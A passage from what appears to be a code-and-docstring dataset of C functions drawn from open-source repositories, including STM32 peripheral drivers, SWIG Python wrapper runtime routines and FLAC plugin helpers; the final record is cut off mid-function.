{"docstring": "/**\n  * @brief  Initializes the FSMC NOR/SRAM Banks according to the specified\n  *         parameters in the FSMC_NORSRAMInitStruct.\n  * @param  FSMC_NORSRAMInitStruct : pointer to a FSMC_NORSRAMInitTypeDef\n  *         structure that contains the configuration information for \n  *        the FSMC NOR/SRAM specified Banks.                       \n  * @retval None\n  */\n", "func_signal": "void FSMC_NORSRAMInit(FSMC_NORSRAMInitTypeDef* FSMC_NORSRAMInitStruct)", "code": "{ \n  /* Check the parameters */\n  assert_param(IS_FSMC_NORSRAM_BANK(FSMC_NORSRAMInitStruct->FSMC_Bank));\n  assert_param(IS_FSMC_MUX(FSMC_NORSRAMInitStruct->FSMC_DataAddressMux));\n  assert_param(IS_FSMC_MEMORY(FSMC_NORSRAMInitStruct->FSMC_MemoryType));\n  assert_param(IS_FSMC_MEMORY_WIDTH(FSMC_NORSRAMInitStruct->FSMC_MemoryDataWidth));\n  assert_param(IS_FSMC_BURSTMODE(FSMC_NORSRAMInitStruct->FSMC_BurstAccessMode));\n  assert_param(IS_FSMC_ASYNWAIT(FSMC_NORSRAMInitStruct->FSMC_AsynchronousWait));\n  assert_param(IS_FSMC_WAIT_POLARITY(FSMC_NORSRAMInitStruct->FSMC_WaitSignalPolarity));\n  assert_param(IS_FSMC_WRAP_MODE(FSMC_NORSRAMInitStruct->FSMC_WrapMode));\n  assert_param(IS_FSMC_WAIT_SIGNAL_ACTIVE(FSMC_NORSRAMInitStruct->FSMC_WaitSignalActive));\n  assert_param(IS_FSMC_WRITE_OPERATION(FSMC_NORSRAMInitStruct->FSMC_WriteOperation));\n  assert_param(IS_FSMC_WAITE_SIGNAL(FSMC_NORSRAMInitStruct->FSMC_WaitSignal));\n  assert_param(IS_FSMC_EXTENDED_MODE(FSMC_NORSRAMInitStruct->FSMC_ExtendedMode));\n  assert_param(IS_FSMC_WRITE_BURST(FSMC_NORSRAMInitStruct->FSMC_WriteBurst));  \n  assert_param(IS_FSMC_ADDRESS_SETUP_TIME(FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AddressSetupTime));\n  assert_param(IS_FSMC_ADDRESS_HOLD_TIME(FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AddressHoldTime));\n  assert_param(IS_FSMC_DATASETUP_TIME(FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_DataSetupTime));\n  assert_param(IS_FSMC_TURNAROUND_TIME(FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_BusTurnAroundDuration));\n  assert_param(IS_FSMC_CLK_DIV(FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_CLKDivision));\n  assert_param(IS_FSMC_DATA_LATENCY(FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_DataLatency));\n  assert_param(IS_FSMC_ACCESS_MODE(FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AccessMode)); \n  \n  /* Bank1 NOR/SRAM control register configuration */ \n  FSMC_Bank1->BTCR[FSMC_NORSRAMInitStruct->FSMC_Bank] = \n            (uint32_t)FSMC_NORSRAMInitStruct->FSMC_DataAddressMux |\n            FSMC_NORSRAMInitStruct->FSMC_MemoryType |\n            FSMC_NORSRAMInitStruct->FSMC_MemoryDataWidth |\n            FSMC_NORSRAMInitStruct->FSMC_BurstAccessMode |\n            FSMC_NORSRAMInitStruct->FSMC_AsynchronousWait |\n            FSMC_NORSRAMInitStruct->FSMC_WaitSignalPolarity |\n            FSMC_NORSRAMInitStruct->FSMC_WrapMode |\n            FSMC_NORSRAMInitStruct->FSMC_WaitSignalActive |\n            FSMC_NORSRAMInitStruct->FSMC_WriteOperation |\n            FSMC_NORSRAMInitStruct->FSMC_WaitSignal |\n            FSMC_NORSRAMInitStruct->FSMC_ExtendedMode |\n            FSMC_NORSRAMInitStruct->FSMC_WriteBurst;\n\n  if(FSMC_NORSRAMInitStruct->FSMC_MemoryType == FSMC_MemoryType_NOR)\n  {\n    FSMC_Bank1->BTCR[FSMC_NORSRAMInitStruct->FSMC_Bank] |= (uint32_t)BCR_FACCEN_Set;\n  }\n  \n  /* Bank1 NOR/SRAM timing register configuration */\n  FSMC_Bank1->BTCR[FSMC_NORSRAMInitStruct->FSMC_Bank+1] = \n            (uint32_t)FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AddressSetupTime |\n            (FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AddressHoldTime << 4) |\n            (FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_DataSetupTime << 8) |\n            (FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_BusTurnAroundDuration << 16) |\n            (FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_CLKDivision << 20) |\n            (FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_DataLatency << 24) |\n             FSMC_NORSRAMInitStruct->FSMC_ReadWriteTimingStruct->FSMC_AccessMode;\n            \n    \n  /* Bank1 NOR/SRAM timing register for write configuration, if extended mode is used */\n  if(FSMC_NORSRAMInitStruct->FSMC_ExtendedMode == FSMC_ExtendedMode_Enable)\n  {\n    assert_param(IS_FSMC_ADDRESS_SETUP_TIME(FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AddressSetupTime));\n    assert_param(IS_FSMC_ADDRESS_HOLD_TIME(FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AddressHoldTime));\n    assert_param(IS_FSMC_DATASETUP_TIME(FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_DataSetupTime));\n    assert_param(IS_FSMC_CLK_DIV(FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_CLKDivision));\n    assert_param(IS_FSMC_DATA_LATENCY(FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_DataLatency));\n    assert_param(IS_FSMC_ACCESS_MODE(FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AccessMode));\n    FSMC_Bank1E->BWTR[FSMC_NORSRAMInitStruct->FSMC_Bank] = \n              (uint32_t)FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AddressSetupTime |\n              (FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AddressHoldTime << 4 )|\n              (FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_DataSetupTime << 8) |\n              (FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_CLKDivision << 20) |\n              (FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_DataLatency << 24) |\n               FSMC_NORSRAMInitStruct->FSMC_WriteTimingStruct->FSMC_AccessMode;\n  }\n  else\n  {\n    FSMC_Bank1E->BWTR[FSMC_NORSRAMInitStruct->FSMC_Bank] = 0x0FFFFFFF;\n  }\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_fsmc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/**\n  * @brief  Enables or disables the specified ADC DMA request.\n  * @param  ADCx: where x can be 1 or 3 to select the ADC peripheral.\n  *   Note: ADC2 hasn't a DMA capability.\n  * @param  NewState: new state of the selected ADC DMA transfer.\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_DMACmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_DMA_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC DMA request */\n    ADCx->CR2 |= CR2_DMA_Set;\n  }\n  else\n  {\n    /* Disable the selected ADC DMA request */\n    ADCx->CR2 &= CR2_DMA_Reset;\n  }\n}", "path": "MCU\\Libraries\\STM32F10x_StdPeriph_Driver\\src\\stm32f10x_adc.c", "repo_name": "eleqian/WiDSO", "stars": 87, "license": "mit", "language": "c", "size": 3506}
{"docstring": "/* Convert a function ptr value */\n", "func_signal": "SWIGRUNTIME int\nSWIG_Python_ConvertFunctionPtr(PyObject *obj, void **ptr, swig_type_info *ty)", "code": "{\n  if (!PyCFunction_Check(obj)) {\n    return SWIG_ConvertPtr(obj, ptr, ty, 0);\n  } else {\n    void *vptr = 0;\n    \n    /* here we get the method pointer for callbacks */\n    const char *doc = (((PyCFunctionObject *)obj) -> m_ml -> ml_doc);\n    const char *desc = doc ? strstr(doc, \"swig_ptr: \") : 0;\n    if (desc)\n      desc = ty ? SWIG_UnpackVoidPtr(desc + 10, &vptr, ty->name) : 0;\n    if (!desc) \n      return SWIG_ERROR;\n    if (ty) {\n      swig_cast_info *tc = SWIG_TypeCheck(desc,ty);\n      if (tc) {\n        int newmemory = 0;\n        *ptr = SWIG_TypeCast(tc,vptr,&newmemory);\n        assert(!newmemory); /* newmemory handling not yet implemented */\n      } else {\n        return SWIG_ERROR;\n      }\n    } else {\n      *ptr = vptr;\n    }\n    return SWIG_OK;\n  }\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n   Dynamic pointer casting. Down an inheritance hierarchy\n*/\n", "func_signal": "SWIGRUNTIME swig_type_info *\nSWIG_TypeDynamicCast(swig_type_info *ty, void **ptr)", "code": "{\n  swig_type_info *lastty = ty;\n  if (!ty || !ty->dcast) return ty;\n  while (ty && (ty->dcast)) {\n    ty = (*ty->dcast)(ptr);\n    if (ty) lastty = ty;\n  }\n  return lastty;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* Acquire a pointer value */\n", "func_signal": "SWIGRUNTIME int\nSWIG_Python_AcquirePtr(PyObject *obj, int own)", "code": "{\n  if (own == SWIG_POINTER_OWN) {\n    SwigPyObject *sobj = SWIG_Python_GetSwigThis(obj);\n    if (sobj) {\n      int oldown = sobj->own;\n      sobj->own = own;\n      return oldown;\n    }\n  }\n  return 0;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* Create a new pointer object */\n", "func_signal": "SWIGRUNTIME PyObject *\nSWIG_Python_NewPointerObj(PyObject *self, void *ptr, swig_type_info *type, int flags)", "code": "{\n  SwigPyClientData *clientdata;\n  PyObject * robj;\n  int own;\n\n  if (!ptr)\n    return SWIG_Py_Void();\n\n  clientdata = type ? (SwigPyClientData *)(type->clientdata) : 0;\n  own = (flags & SWIG_POINTER_OWN) ? SWIG_POINTER_OWN : 0;\n  if (clientdata && clientdata->pytype) {\n    SwigPyObject *newobj;\n    if (flags & SWIG_BUILTIN_TP_INIT) {\n      newobj = (SwigPyObject*) self;\n      if (newobj->ptr) {\n        PyObject *next_self = clientdata->pytype->tp_alloc(clientdata->pytype, 0);\n        while (newobj->next)\n\t  newobj = (SwigPyObject *) newobj->next;\n        newobj->next = next_self;\n        newobj = (SwigPyObject *)next_self;\n      }\n    } else {\n      newobj = PyObject_New(SwigPyObject, clientdata->pytype);\n    }\n    if (newobj) {\n      newobj->ptr = ptr;\n      newobj->ty = type;\n      newobj->own = own;\n      newobj->next = 0;\n#ifdef SWIGPYTHON_BUILTIN\n      newobj->dict = 0;\n#endif\n      return (PyObject*) newobj;\n    }\n    return SWIG_Py_Void();\n  }\n\n  assert(!(flags & SWIG_BUILTIN_TP_INIT));\n\n  robj = SwigPyObject_New(ptr, type, own);\n  if (robj && clientdata && !(flags & SWIG_POINTER_NOSHADOW)) {\n    PyObject *inst = SWIG_Python_NewShadowInstance(clientdata, robj);\n    Py_DECREF(robj);\n    robj = inst;\n  }\n  return robj;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* Warning: This function will allocate a new string in Python 3,\n * so please call SWIG_Python_str_DelForPy3(x) to free the space.\n */\n", "func_signal": "SWIGINTERN char*\nSWIG_Python_str_AsChar(PyObject *str)", "code": "{\n#if PY_VERSION_HEX >= 0x03000000\n  char *cstr;\n  char *newstr;\n  Py_ssize_t len;\n  str = PyUnicode_AsUTF8String(str);\n  PyBytes_AsStringAndSize(str, &cstr, &len);\n  newstr = (char *) malloc(len+1);\n  memcpy(newstr, cstr, len+1);\n  Py_XDECREF(str);\n  return newstr;\n#else\n  return PyString_AsString(str);\n#endif\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n  Compare two type names skipping the space characters, therefore\n  \"char*\" == \"char *\" and \"Class<int>\" == \"Class<int >\", etc.\n\n  Return 0 when the two name types are equivalent, as in\n  strncmp, but skipping ' '.\n*/\n", "func_signal": "SWIGRUNTIME int\nSWIG_TypeNameComp(const char *f1, const char *l1,\n\t\t  const char *f2, const char *l2)", "code": "{\n  for (;(f1 != l1) && (f2 != l2); ++f1, ++f2) {\n    while ((*f1 == ' ') && (f1 != l1)) ++f1;\n    while ((*f2 == ' ') && (f2 != l2)) ++f2;\n    if (*f1 != *f2) return (*f1 > *f2) ? 1 : -1;\n  }\n  return (int)((l1 - f1) - (l2 - f2));\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n  Identical to SWIG_TypeCheck, except strcmp is replaced with a pointer comparison\n*/\n", "func_signal": "SWIGRUNTIME swig_cast_info *\nSWIG_TypeCheckStruct(swig_type_info *from, swig_type_info *ty)", "code": "{\n  if (ty) {\n    swig_cast_info *iter = ty->cast;\n    while (iter) {\n      if (iter->type == from) {\n        if (iter == ty->cast)\n          return iter;\n        /* Move iter to the top of the linked list */\n        iter->prev->next = iter->next;\n        if (iter->next)\n          iter->next->prev = iter->prev;\n        iter->next = ty->cast;\n        iter->prev = 0;\n        if (ty->cast) ty->cast->prev = iter;\n        ty->cast = iter;\n        return iter;\n      }\n      iter = iter->next;\n    }\n  }\n  return 0;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* Unpack the argument tuple */\n", "func_signal": "SWIGINTERN int\nSWIG_Python_UnpackTuple(PyObject *args, const char *name, Py_ssize_t min, Py_ssize_t max, PyObject **objs)", "code": "{\n  if (!args) {\n    if (!min && !max) {\n      return 1;\n    } else {\n      PyErr_Format(PyExc_TypeError, \"%s expected %s%d arguments, got none\", \n\t\t   name, (min == max ? \"\" : \"at least \"), (int)min);\n      return 0;\n    }\n  }  \n  if (!PyTuple_Check(args)) {\n    if (min <= 1 && max >= 1) {\n      register int i;\n      objs[0] = args;\n      for (i = 1; i < max; ++i) {\n\tobjs[i] = 0;\n      }\n      return 2;\n    }\n    PyErr_SetString(PyExc_SystemError, \"UnpackTuple() argument list is not a tuple\");\n    return 0;\n  } else {\n    register Py_ssize_t l = PyTuple_GET_SIZE(args);\n    if (l < min) {\n      PyErr_Format(PyExc_TypeError, \"%s expected %s%d arguments, got %d\", \n\t\t   name, (min == max ? \"\" : \"at least \"), (int)min, (int)l);\n      return 0;\n    } else if (l > max) {\n      PyErr_Format(PyExc_TypeError, \"%s expected %s%d arguments, got %d\", \n\t\t   name, (min == max ? \"\" : \"at most \"), (int)max, (int)l);\n      return 0;\n    } else {\n      register int i;\n      for (i = 0; i < l; ++i) {\n\tobjs[i] = PyTuple_GET_ITEM(args, i);\n      }\n      for (; l < max; ++l) {\n\tobjs[l] = 0;\n      }\n      return i + 1;\n    }    \n  }\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n   Unpack binary data from a string\n*/\n", "func_signal": "SWIGRUNTIME const char *\nSWIG_UnpackData(const char *c, void *ptr, size_t sz)", "code": "{\n  register unsigned char *u = (unsigned char *) ptr;\n  register const unsigned char *eu = u + sz;\n  for (; u != eu; ++u) {\n    register char d = *(c++);\n    register unsigned char uu;\n    if ((d >= '0') && (d <= '9'))\n      uu = ((d - '0') << 4);\n    else if ((d >= 'a') && (d <= 'f'))\n      uu = ((d - ('a'-10)) << 4);\n    else\n      return (char *) 0;\n    d = *(c++);\n    if ((d >= '0') && (d <= '9'))\n      uu |= (d - '0');\n    else if ((d >= 'a') && (d <= 'f'))\n      uu |= (d - ('a'-10));\n    else\n      return (char *) 0;\n    *u = uu;\n  }\n  return c;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* Convert a pointer value */\n", "func_signal": "SWIGRUNTIME int\nSWIG_Python_ConvertPtrAndOwn(PyObject *obj, void **ptr, swig_type_info *ty, int flags, int *own)", "code": "{\n  int res;\n  SwigPyObject *sobj;\n  int implicit_conv = (flags & SWIG_POINTER_IMPLICIT_CONV) != 0;\n\n  if (!obj)\n    return SWIG_ERROR;\n  if (obj == Py_None && !implicit_conv) {\n    if (ptr)\n      *ptr = 0;\n    return SWIG_OK;\n  }\n\n  res = SWIG_ERROR;\n\n  sobj = SWIG_Python_GetSwigThis(obj);\n  if (own)\n    *own = 0;\n  while (sobj) {\n    void *vptr = sobj->ptr;\n    if (ty) {\n      swig_type_info *to = sobj->ty;\n      if (to == ty) {\n        /* no type cast needed */\n        if (ptr) *ptr = vptr;\n        break;\n      } else {\n        swig_cast_info *tc = SWIG_TypeCheck(to->name,ty);\n        if (!tc) {\n          sobj = (SwigPyObject *)sobj->next;\n        } else {\n          if (ptr) {\n            int newmemory = 0;\n            *ptr = SWIG_TypeCast(tc,vptr,&newmemory);\n            if (newmemory == SWIG_CAST_NEW_MEMORY) {\n              assert(own); /* badly formed typemap which will lead to a memory leak - it must set and use own to delete *ptr */\n              if (own)\n                *own = *own | SWIG_CAST_NEW_MEMORY;\n            }\n          }\n          break;\n        }\n      }\n    } else {\n      if (ptr) *ptr = vptr;\n      break;\n    }\n  }\n  if (sobj) {\n    if (own)\n      *own = *own | sobj->own;\n    if (flags & SWIG_POINTER_DISOWN) {\n      sobj->own = 0;\n    }\n    res = SWIG_OK;\n  } else {\n    if (implicit_conv) {\n      SwigPyClientData *data = ty ? (SwigPyClientData *) ty->clientdata : 0;\n      if (data && !data->implicitconv) {\n        PyObject *klass = data->klass;\n        if (klass) {\n          PyObject *impconv;\n          data->implicitconv = 1; /* avoid recursion and call 'explicit' constructors*/\n          impconv = SWIG_Python_CallFunctor(klass, obj);\n          data->implicitconv = 0;\n          if (PyErr_Occurred()) {\n            PyErr_Clear();\n            impconv = 0;\n          }\n          if (impconv) {\n            SwigPyObject *iobj = SWIG_Python_GetSwigThis(impconv);\n            if (iobj) {\n              void *vptr;\n              res = SWIG_Python_ConvertPtrAndOwn((PyObject*)iobj, &vptr, ty, 0, 0);\n              if (SWIG_IsOK(res)) {\n                if (ptr) {\n                  *ptr = vptr;\n                  /* transfer the ownership to 'ptr' */\n                  iobj->own = 0;\n                  res = SWIG_AddCast(res);\n                  res = SWIG_AddNewMask(res);\n                } else {\n                  res = SWIG_AddCast(res);\t\t    \n                }\n              }\n            }\n            Py_DECREF(impconv);\n          }\n        }\n      }\n    }\n    if (!SWIG_IsOK(res) && obj == Py_None) {\n      if (ptr)\n        *ptr = 0;\n      if (PyErr_Occurred())\n        PyErr_Clear();\n      res = SWIG_OK;\n    }\n  }\n  return res;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n  Check type equivalence in a name list like <name1>|<name2>|...\n  Return 0 if equal, -1 if nb < tb, 1 if nb > tb\n*/\n", "func_signal": "SWIGRUNTIME int\nSWIG_TypeCmp(const char *nb, const char *tb)", "code": "{\n  int equiv = 1;\n  const char* te = tb + strlen(tb);\n  const char* ne = nb;\n  while (equiv != 0 && *ne) {\n    for (nb = ne; *ne; ++ne) {\n      if (*ne == '|') break;\n    }\n    equiv = SWIG_TypeNameComp(nb, ne, tb, te);\n    if (*ne) ++ne;\n  }\n  return equiv;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* PyModule_AddObject function was introduced in Python 2.0.  The following function\n   is copied out of Python/modsupport.c in python version 2.3.4 */\n", "func_signal": "SWIGINTERN int\nPyModule_AddObject(PyObject *m, char *name, PyObject *o)", "code": "{\n  PyObject *dict;\n  if (!PyModule_Check(m)) {\n    PyErr_SetString(PyExc_TypeError,\n\t\t    \"PyModule_AddObject() needs module as first arg\");\n    return SWIG_ERROR;\n  }\n  if (!o) {\n    PyErr_SetString(PyExc_TypeError,\n\t\t    \"PyModule_AddObject() needs non-NULL value\");\n    return SWIG_ERROR;\n  }\n  \n  dict = PyModule_GetDict(m);\n  if (dict == NULL) {\n    /* Internal error -- modules must have a dict! */\n    PyErr_Format(PyExc_SystemError, \"module '%s' has no __dict__\",\n\t\t PyModule_GetName(m));\n    return SWIG_ERROR;\n  }\n  if (PyDict_SetItemString(dict, name, o))\n    return SWIG_ERROR;\n  Py_DECREF(o);\n  return SWIG_OK;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n  Search for a swig_type_info structure only by mangled name\n  Search is a O(log #types)\n\n  We start searching at module start, and finish searching when start == end.\n  Note: if start == end at the beginning of the function, we go all the way around\n  the circular list.\n*/\n", "func_signal": "SWIGRUNTIME swig_type_info *\nSWIG_MangledTypeQueryModule(swig_module_info *start,\n                            swig_module_info *end,\n\t\t            const char *name)", "code": "{\n  swig_module_info *iter = start;\n  do {\n    if (iter->size) {\n      register size_t l = 0;\n      register size_t r = iter->size - 1;\n      do {\n\t/* since l+r >= 0, we can (>> 1) instead (/ 2) */\n\tregister size_t i = (l + r) >> 1;\n\tconst char *iname = iter->types[i]->name;\n\tif (iname) {\n\t  register int compare = strcmp(name, iname);\n\t  if (compare == 0) {\n\t    return iter->types[i];\n\t  } else if (compare < 0) {\n\t    if (i) {\n\t      r = i - 1;\n\t    } else {\n\t      break;\n\t    }\n\t  } else if (compare > 0) {\n\t    l = i + 1;\n\t  }\n\t} else {\n\t  break; /* should never happen */\n\t}\n      } while (l <= r);\n    }\n    iter = iter->next;\n  } while (iter != end);\n  return 0;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n   Set the clientdata field for a type\n*/\n", "func_signal": "SWIGRUNTIME void\nSWIG_TypeClientData(swig_type_info *ti, void *clientdata)", "code": "{\n  swig_cast_info *cast = ti->cast;\n  /* if (ti->clientdata == clientdata) return; */\n  ti->clientdata = clientdata;\n\n  while (cast) {\n    if (!cast->converter) {\n      swig_type_info *tc = cast->type;\n      if (!tc->clientdata) {\n\tSWIG_TypeClientData(tc, clientdata);\n      }\n    }\n    cast = cast->next;\n  }\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* The python void return value */\n", "func_signal": "SWIGRUNTIMEINLINE PyObject * \nSWIG_Py_Void(void)", "code": "{\n  PyObject *none = Py_None;\n  Py_INCREF(none);\n  return none;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* Convert a pointer value, signal an exception on a type mismatch */\n", "func_signal": "SWIGRUNTIME void *\nSWIG_Python_MustGetPtr(PyObject *obj, swig_type_info *ty, int SWIGUNUSEDPARM(argnum), int flags)", "code": "{\n  void *result;\n  if (SWIG_Python_ConvertPtr(obj, &result, ty, flags) == -1) {\n    PyErr_Clear();\n#if SWIG_POINTER_EXCEPTION\n    if (flags) {\n      SWIG_Python_TypeError(SWIG_TypePrettyName(ty), obj);\n      SWIG_Python_ArgFail(argnum);\n    }\n#endif\n  }\n  return result;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n   Pack 'void *' into a string buffer.\n*/\n", "func_signal": "SWIGRUNTIME char *\nSWIG_PackVoidPtr(char *buff, void *ptr, const char *name, size_t bsz)", "code": "{\n  char *r = buff;\n  if ((2*sizeof(void *) + 2) > bsz) return 0;\n  *(r++) = '_';\n  r = SWIG_PackData(r,&ptr,sizeof(void *));\n  if (strlen(name) + 1 > (bsz - (r - buff))) return 0;\n  strcpy(r,name);\n  return buff;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* Added for Python 3.x, would it also be useful for Python 2.x? */\n", "func_signal": "SWIGRUNTIME PyObject*\nSwigPyObject_richcompare(SwigPyObject *v, SwigPyObject *w, int op)", "code": "{\n  PyObject* res;\n  if( op != Py_EQ && op != Py_NE ) {\n    Py_INCREF(Py_NotImplemented);\n    return Py_NotImplemented;\n  }\n  res = PyBool_FromLong( (SwigPyObject_compare(v, w)==0) == (op == Py_EQ) ? 1 : 0);\n  return res;  \n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/* -----------------------------------------------------------------------------\n * error manipulation\n * ----------------------------------------------------------------------------- */\n", "func_signal": "SWIGRUNTIME PyObject*\nSWIG_Python_ErrorType(int code)", "code": "{\n  PyObject* type = 0;\n  switch(code) {\n  case SWIG_MemoryError:\n    type = PyExc_MemoryError;\n    break;\n  case SWIG_IOError:\n    type = PyExc_IOError;\n    break;\n  case SWIG_RuntimeError:\n    type = PyExc_RuntimeError;\n    break;\n  case SWIG_IndexError:\n    type = PyExc_IndexError;\n    break;\n  case SWIG_TypeError:\n    type = PyExc_TypeError;\n    break;\n  case SWIG_DivisionByZero:\n    type = PyExc_ZeroDivisionError;\n    break;\n  case SWIG_OverflowError:\n    type = PyExc_OverflowError;\n    break;\n  case SWIG_SyntaxError:\n    type = PyExc_SyntaxError;\n    break;\n  case SWIG_ValueError:\n    type = PyExc_ValueError;\n    break;\n  case SWIG_SystemError:\n    type = PyExc_SystemError;\n    break;\n  case SWIG_AttributeError:\n    type = PyExc_AttributeError;\n    break;\n  default:\n    type = PyExc_RuntimeError;\n  }\n  return type;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n  Return the pretty name associated with this type,\n  that is an unmangled type name in a form presentable to the user.\n*/\n", "func_signal": "SWIGRUNTIME const char *\nSWIG_TypePrettyName(const swig_type_info *type)", "code": "{\n  /* The \"str\" field contains the equivalent pretty names of the\n     type, separated by vertical-bar characters.  We choose\n     to print the last name, as it is often (?) the most\n     specific. */\n  if (!type) return NULL;\n  if (type->str != NULL) {\n    const char *last_name = type->str;\n    const char *s;\n    for (s = type->str; *s; s++)\n      if (*s == '|') last_name = s+1;\n    return last_name;\n  }\n  else\n    return type->name;\n}", "path": "quantz_kit\\weights_compress_wrap.c", "repo_name": "yuanyuanli85/CaffeModelCompression", "stars": 107, "license": "None", "language": "c", "size": 80}
{"docstring": "/*\n * Get text of an Entry or a ComboBox\n */\n", "func_signal": "static gchar *gtk_entry_get_text_1 (GtkWidget *widget)", "code": "{\n\tif (GTK_IS_COMBO(widget))\n\t{\n\t\treturn gtk_entry_get_text(GTK_ENTRY(GTK_COMBO(widget)->entry));\n\t}else if (GTK_IS_ENTRY(widget))\n\t{\n\t\treturn gtk_entry_get_text(GTK_ENTRY(widget));\n\t}else\n\t{\n\t\treturn NULL;\n\t}\n}", "path": "VoiceRecognition\\jni\\flac\\src\\plugin_xmms\\configure.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n * this only works with sorted cuesheets (the spec strongly recommends but\n * does not require sorted cuesheets).  but if it's not sorted, picking a\n * nearest cue point has no significance.\n */\n", "func_signal": "static FLAC__uint64 local__find_closest_cue_(const FLAC__StreamMetadata_CueSheet *cuesheet, unsigned track, unsigned index, FLAC__uint64 total_samples, FLAC__bool look_forward)", "code": "{\n\tint t, i;\n\tif(look_forward) {\n\t\tfor(t = 0; t < (int)cuesheet->num_tracks; t++)\n\t\t\tfor(i = 0; i < (int)cuesheet->tracks[t].num_indices; i++)\n\t\t\t\tif(cuesheet->tracks[t].number > track || (cuesheet->tracks[t].number == track && cuesheet->tracks[t].indices[i].number >= index))\n\t\t\t\t\treturn cuesheet->tracks[t].offset + cuesheet->tracks[t].indices[i].offset;\n\t\treturn total_samples;\n\t}\n\telse {\n\t\tfor(t = (int)cuesheet->num_tracks - 1; t >= 0; t--)\n\t\t\tfor(i = 